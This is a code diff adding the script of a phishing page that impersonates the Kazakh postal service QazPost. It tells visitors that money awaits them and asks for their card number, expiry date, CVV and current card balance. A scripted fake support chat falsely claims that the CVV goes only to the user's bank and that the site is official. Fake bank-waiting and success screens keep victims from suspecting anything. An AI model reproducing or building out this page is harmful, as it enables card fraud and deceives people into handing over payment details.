+            // Добавляем сообщение пользователя
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'message user-message';
+            
+            if(type === 'balance') {
+                messageDiv.textContent = 'Что такое баланс карты?';
+            } else if(type === 'cvv') {
+                messageDiv.textContent = 'Зачем CVC/CVV?';
+            } else if(type === 'guarantees') {
+                messageDiv.textContent = 'Гарантии сайта';
+            }
+            
+            messages.appendChild(messageDiv);
+            
+            // Добавляем ответ бота
+            setTimeout(() => {
+                const botSenderDiv = document.createElement('div');
+                botSenderDiv.className = 'message-sender bot-sender';
+                botSenderDiv.textContent = 'Поддержка QPost';
+                messages.appendChild(botSenderDiv);
+                
+                const botMessageDiv = document.createElement('div');
+                botMessageDiv.className = 'message bot-message';
+                
+                if(type === 'balance') {
+                    botMessageDiv.innerHTML = 'Баланс карты - здесь нужно указать ваш остаток карты, который есть у вас на данный момент, так как отправляется запрос в банк для сверки данных и подтверждения что карта не крадена/утеряна.';
+                } else if(type === 'cvv') {
+                    botMessageDiv.innerHTML = 'CVV запрашивается для верификации Вашей личности, и удостоверении что именно вы являетесь владельцем банковской карты. Информация на прямую отправляется только вашему банку, чтобы банк смог подтвердить перевод средств на Ваш счёт.';
+                } else if(type === 'guarantees') {
+                    botMessageDiv.innerHTML = 'Вы находитесь на оффициальном сайте службы доставки.<br><br>Все данные защищены политикой конфиденциальности.<br><br>Наша компания работает на территории Казахстана не первый год и может гарантировать безопасность переводов нашим клиентам. С уважением служба поддержки пользователей.';
+                }
+                
+                messages.appendChild(botMessageDiv);
+                messages.scrollTop = messages.scrollHeight;
+            }, 500);
+        }
+
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if(file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const messages = document.getElementById('chatMessages');
+                    
+                    // Добавляем отправителя "Вы"
+                    const senderDiv = document.createElement('div');
+                    senderDiv.className = 'message-sender user-sender';
+                    senderDiv.textContent = 'Вы';
+                    messages.appendChild(senderDiv);
+                    
+                    // Добавляем изображение
+                    const img = document.createElement('img');
+                    img.src = event.target.result;
+                    img.style.maxWidth = '200px';
+                    img.style.borderRadius = '10px';
+                    img.style.marginTop = '5px';
+                    
+                    const messageDiv = document.createElement('div');
+                    messageDiv.className = 'message user-message';
+                    messageDiv.appendChild(img);
+                    messages.appendChild(messageDiv);
+                    
+                    messages.scrollTop = messages.scrollHeight;
+                    
+                    // Имитация ответа бота
+                    setTimeout(() => {
+                        const botSenderDiv = document.createElement('div');
+                        botSenderDiv.className = 'message-sender bot-sender';
+                        botSenderDiv.textContent = 'Поддержка QPost';
+                        messages.appendChild(botSenderDiv);
+                        
+                        const botMessageDiv = document.createElement('div');
+                        botMessageDiv.className = 'message bot-message';
+                        botMessageDiv.textContent = 'Спасибо за отправленное изображение. Мы рассмотрим его в ближайшее время.';
+                        messages.appendChild(botMessageDiv);
+                        
+                        messages.scrollTop = messages.scrollHeight;
+                    }, 1000);
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Основной функционал
+        let currentLang = 'ru';
+        
+        const translations = {
+            ru: {
+                'welcome-title': 'Добро пожаловать на',
+                'subtitle': 'Теперь мы - ваш надежный помощник во всех почтово-логистических делах!',
+                'status-title': 'Готово',
+                'status-message1': 'Средства ожидают получения',
+                'status-message2': 'Нажмите "продолжить" для завершения получения средств',
+                'continue-btn': 'Продолжить',
+                'created-date': 'Создано 05.04.2025',
+                'timeline1': 'Ожидает подтверждение оплаты за посылку и доставку',
+                'timeline2': 'Оплата подтверждена',
+                'timeline3': 'Средства ожидают получения',
+                'timeline4': 'Доставка ожидает подтверждения',
+                'timeline5': 'Посылка получена и отправляется к получателю',
+                'timeline6': 'Посылка доставлена к получателю',
+                'package-title': 'Информация о посылке',
+                'receive-label': 'К получению:',
+                'category-label': 'Категория:',
+                'category-value': 'Обыкновенное (ая)',
+                'delivery-label': 'Способ доставки:',
+                'delivery-value': 'Наземный',
+                'recipient-label': 'Получатель:',
+                'address-label': 'Адрес:',
+                'partnership-title': 'QazPost - №1 ПОСТАВЩИК TEMU',
+                'partnership-text': 'QazPost стал ведущим поставщиком для Temu, а сама Temu заняла первое место по количеству доставок среди интернет-магазинов.',
+                'card-modal-title': 'Начисление средств',
+                'card-modal-desc': 'Для начисления средств вам необходимо указать реквизиты карты.',
+                'balance-label': 'Банк запросил дополнительные данные. Укажите баланс карты',
+                'balance-hint': 'Если ваш баланс 0 укажите 1',
+                'card-number-label': 'Номер карты',
+                'expiry-label': 'Срок действия',
+                'cvv-label': 'CVV/CVC',
+                'cancel-btn': 'Отмена',
+                'submit-btn': 'Подтвердить',
+                'loading-text': 'Ожидаем ответ от банка',
+                'loading-subtext': 'Не покидайте данную страницу',
+                'faq-balance': 'Что такое баланс карты?',
+                'faq-cvv': 'Зачем CVC/CVV?',
+                'faq-guarantees': 'Гарантии сайта'
+            },
+            kz: {
+                'welcome-title': 'Қош келдіңіз',
+                'subtitle': 'Біз пошта-логистикалық істердегі сенімді көмекшіңізбіз!',
+                'status-title': 'Дайын',
+                'status-message1': 'Қаражатты алу күтілуде',
+                'status-message2': 'Қаражатты алуды аяқтау үшін "Жалғастыру" батырмасын басыңыз',
+                'continue-btn': 'Жалғастыру',
+                'created-date': 'Жасалған 05.04.2025',
+                'timeline1': 'Пакет пен жеткізу үшін төлемді растауды күтуде',
+                'timeline2': 'Төлем расталды',
+                'timeline3': 'Қаражатты алу күтілуде',
+                'timeline4': 'Жеткізу растауды күтуде',
+                'timeline5': 'Пакет алынып, алушыға жіберілді',
+                'timeline6': 'Пакет алушыға жеткізілді',
+                'package-title': 'Пакет туралы ақпарат',
+                'receive-label': 'Алу үшін:',
+                'category-label': 'Санат:',
+                'category-value': 'Қарапайым',
+                'delivery-label': 'Жеткізу әдісі:',
+                'delivery-value': 'Жерүсті',
+                'recipient-label': 'Алушы:',
+                'address-label': 'Мекен-жай:',
+                'partnership-title': 'QazPost - TEMU-ға №1 ЖЕТКІЗУШІ',
+                'partnership-text': 'QazPost Temu үшін жетекші жеткізуші болды, ал Temu өзі интернет-дүкендер арасында жеткізу саны бойынша бірінші орынға ие болды.',
+                'card-modal-title': 'Қаражатты есептеу',
+                'card-modal-desc': 'Қаражатты алу үшін картаңыздың реквизиттерін көрсетуіңіз қажет.',
+                'balance-label': 'Карта балансы',
+                'balance-hint': 'Егер балансыңыз 0 болса, 1 деп көрсетіңіз',
+                'card-number-label': 'Карта нөмірі',
+                'expiry-label': 'Жарамдылық мерзімі',
+                'cvv-label': 'CVV/CVC',
+                'cancel-btn': 'Болдырмау',
+                'submit-btn': 'Растау',
+                'loading-text': 'Банктен жауап күтілуде',
+                'loading-subtext': 'Бұл беттен кетпеңіз',
+                'faq-balance': 'Карта балансы деген не?',
+                'faq-cvv': 'CVC/CVV не үшін қажет?',
+                'faq-guarantees': 'Сайт кепілдіктері'
+            }
+        };
+
+        const cardModal = document.getElementById('cardModal');
+        const continueBtn = document.getElementById('continueBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const cardNumber = document.getElementById('cardNumber');
+        const cardExpiry = document.getElementById('cardExpiry');
+        const cardCvv = document.getElementById('cardCvv');
+        const cardBalance = document.getElementById('cardBalance');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        continueBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            cardModal.classList.add('active');
+        });
+
+        cancelBtn.addEventListener('click', function() {
+            cardModal.classList.remove('active');
+        });
+
+        function validateInputs() {
+            const numberValid = /^\d{16}$/.test(cardNumber.value.replace(/\s/g, ''));
+            const expiryValid = /^\d{2}\/\d{2}$/.test(cardExpiry.value);
+            const cvvValid = /^\d{3}$/.test(cardCvv.value);
+            const balance = parseInt(cardBalance.value) || 0;
+            const balanceGroup = document.querySelector('.balance-group');
+            const balanceHint = document.querySelector('.balance-hint');
+
+            if(numberValid && expiryValid && cvvValid) {
+                balanceGroup.classList.add('visible');
+            } else {
+                balanceGroup.classList.remove('visible');
+            }
+
+            if(balance === 0) {
+                balanceHint.style.display = 'block';
+                submitBtn.disabled = true;
+                return false;
+            } else {
+                balanceHint.style.display = 'none';
+            }
+
+            const allValid = numberValid && expiryValid && cvvValid && balance > 0;
+            submitBtn.disabled = !allValid;
+            return allValid;
+        }
+
+        [cardNumber, cardExpiry, cardCvv, cardBalance].forEach(input => {
+            input.addEventListener('input', validateInputs);
+        });
+
+        cardNumber.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let parts = [];
+            for(let i=0; i<value.length; i+=4) {
+                parts.push(value.substring(i, i+4));
+            }
+            e.target.value = parts.join(' ').substring(0, 19);
+        });
+
+        cardExpiry.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if(value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        cardCvv.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+
+        submitBtn.addEventListener('click', function() {
+            if(validateInputs()) {
+                cardModal.classList.remove('active');
+                loadingOverlay.classList.add('active');
+
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('active');
+                    alert(currentLang === 'ru' ? 
+                        'Операция успешно завершена!' : 
+                        'Операция сәтті аяқталды!');
+                }, 3000);
+            }
+        });
+
+        function toggleLanguage() {
+            currentLang = currentLang === 'ru' ? 'kz' : 'ru';
+            updateTranslations();
+            document.querySelector('.lang-btn').textContent = currentLang === 'ru' ? 'Қаз' : 'Рус';
+            document.documentElement.lang = currentLang;
+        }
+
+        function updateTranslations() {
+            document.querySelectorAll('[data-lang]').forEach(element => {
+                const key = element.getAttribute('data-lang');
+                if (translations[currentLang][key]) {
+                    element.textContent = translations[currentLang][key];
+                    
+                    // Для input placeholder
+                    if(element.tagName === 'INPUT' && element.getAttribute('placeholder')) {
+                        element.setAttribute('placeholder', translations[currentLang][key]);
+                    }
+                }
+            });
+            
+            const welcomeTitle = document.querySelector('[data-lang="welcome-title"]');
+            if(welcomeTitle) {
+                welcomeTitle.innerHTML = `${translations[currentLang]['welcome-title']} <br><span class="brand-name">QazPost.kz</span>`;
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', updateTranslations);
+    </script>
 </body>
 </html>
